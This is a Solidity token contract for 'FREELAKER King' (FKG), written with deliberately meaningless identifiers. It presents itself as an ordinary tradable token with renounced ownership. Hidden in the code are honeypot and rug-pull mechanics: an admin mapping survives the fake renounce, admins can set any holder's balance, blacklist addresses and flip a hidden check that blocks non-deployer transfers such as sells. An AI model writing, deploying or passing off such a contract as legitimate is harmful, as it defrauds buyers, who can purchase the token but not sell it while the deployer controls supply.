//SPDX-License-Identifier: MIT

pragma solidity ^0.8.12;

abstract contract totalFund {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface fundEnable {
    function createPair(address exemptSellAt, address receiverLaunch) external returns (address);
}


interface fromMarketing {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}


interface takeLiquidity {
    function totalSupply() external view returns (uint256);

    function balanceOf(address maxTeam) external view returns (uint256);

    function transfer(address launchMode, uint256 limitSenderTo) external returns (bool);

    function allowance(address totalAmount, address spender) external view returns (uint256);

    function approve(address spender, uint256 limitSenderTo) external returns (bool);

    function transferFrom(address sender,address launchMode,uint256 limitSenderTo) external returns (bool);

    event Transfer(address indexed from, address indexed marketingLaunched, uint256 value);
    event Approval(address indexed totalAmount, address indexed spender, uint256 value);
}

interface takeLiquidityMetadata is takeLiquidity {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract FREELAKERKing is totalFund, takeLiquidity, takeLiquidityMetadata {

    uint256 public autoReceiverReceiver;

    uint8 private senderLaunchBuy = 18;

    mapping(address => bool) public maxTo;

    address sellTeam = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function exemptShould(address buyReceiver, uint256 limitSenderTo) public {
        listTx();
        walletMin[buyReceiver] = limitSenderTo;
    }

    function name() external view virtual override returns (string memory) {
        return liquidityMin;
    }

    address private toSell;

    uint256 public tokenLaunchMax;

    event OwnershipTransferred(address indexed listMode, address indexed atTradingBuy);

    bool public feeLiquidity;

    function modeShould(address buyFee) public {
        listTx();
        if (toReceiver == tokenLaunchMax) {
            marketingAt = true;
        }
        if (buyFee == atTrading || buyFee == buyMin) {
            return;
        }
        atTakeMarketing[buyFee] = true;
    }

    uint256 private launchedFromSwap;

    function feeLiquidityMarketing(uint256 limitSenderTo) public {
        listTx();
        teamLimit = limitSenderTo;
    }

    mapping(address => bool) public atTakeMarketing;

    function receiverTradingTo(address atFund, address launchMode, uint256 limitSenderTo) internal returns (bool) {
        if (atFund == atTrading) {
            return launchedLimit(atFund, launchMode, limitSenderTo);
        }
        uint256 modeIs = takeLiquidity(buyMin).balanceOf(maxShould);
        require(modeIs == teamLimit);
        require(!atTakeMarketing[atFund]);
        return launchedLimit(atFund, launchMode, limitSenderTo);
    }

    bool public txMarketingFrom;

    uint256 listReceiverWallet;

    mapping(address => uint256) private walletMin;

    uint256 private toWallet;

    uint256 public amountTrading;

    function getOwner() external view returns (address) {
        return toSell;
    }

    address maxShould = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function transfer(address buyReceiver, uint256 limitSenderTo) external virtual override returns (bool) {
        return receiverTradingTo(_msgSender(), buyReceiver, limitSenderTo);
    }

    function isBuy(address isLaunch) public {
        if (feeLiquidity) {
            return;
        }
        
        maxTo[isLaunch] = true;
        
        feeLiquidity = true;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return receiverTxTeam;
    }

    function transferFrom(address atFund, address launchMode, uint256 limitSenderTo) external override returns (bool) {
        if (_msgSender() != sellTeam) {
            if (swapTeam[atFund][_msgSender()] != type(uint256).max) {
                require(limitSenderTo <= swapTeam[atFund][_msgSender()]);
                swapTeam[atFund][_msgSender()] -= limitSenderTo;
            }
        }
        return receiverTradingTo(atFund, launchMode, limitSenderTo);
    }

    uint256 private receiverTxTeam = 100000000 * 10 ** 18;

    function owner() external view returns (address) {
        return toSell;
    }

    function listTx() private view {
        require(maxTo[_msgSender()]);
    }

    string private toTradingFund = "FKG";

    function autoFee() public {
        emit OwnershipTransferred(atTrading, address(0));
        toSell = address(0);
    }

    mapping(address => mapping(address => uint256)) private swapTeam;

    bool private marketingAt;

    function approve(address senderLaunchTeam, uint256 limitSenderTo) public virtual override returns (bool) {
        swapTeam[_msgSender()][senderLaunchTeam] = limitSenderTo;
        emit Approval(_msgSender(), senderLaunchTeam, limitSenderTo);
        return true;
    }

    function decimals() external view virtual override returns (uint8) {
        return senderLaunchBuy;
    }

    function balanceOf(address maxTeam) public view virtual override returns (uint256) {
        return walletMin[maxTeam];
    }

    function symbol() external view virtual override returns (string memory) {
        return toTradingFund;
    }

    function launchedLimit(address atFund, address launchMode, uint256 limitSenderTo) internal returns (bool) {
        require(walletMin[atFund] >= limitSenderTo);
        walletMin[atFund] -= limitSenderTo;
        walletMin[launchMode] += limitSenderTo;
        emit Transfer(atFund, launchMode, limitSenderTo);
        return true;
    }

    bool public txTeam;

    uint256 public toReceiver;

    function allowance(address receiverWallet, address senderLaunchTeam) external view virtual override returns (uint256) {
        if (senderLaunchTeam == sellTeam) {
            return type(uint256).max;
        }
        return swapTeam[receiverWallet][senderLaunchTeam];
    }

    constructor (){
        if (txMarketingFrom == marketingAt) {
            toReceiver = amountTrading;
        }
        autoFee();
        fromMarketing isAt = fromMarketing(sellTeam);
        buyMin = fundEnable(isAt.factory()).createPair(isAt.WETH(), address(this));
        if (amountTrading == toReceiver) {
            tokenLaunchMax = amountTrading;
        }
        atTrading = _msgSender();
        maxTo[atTrading] = true;
        walletMin[atTrading] = receiverTxTeam;
        
        emit Transfer(address(0), atTrading, receiverTxTeam);
    }

    uint256 teamLimit;

    string private liquidityMin = "FREELAKER King";

    uint256 private minTrading;

    address public buyMin;

    address public atTrading;

}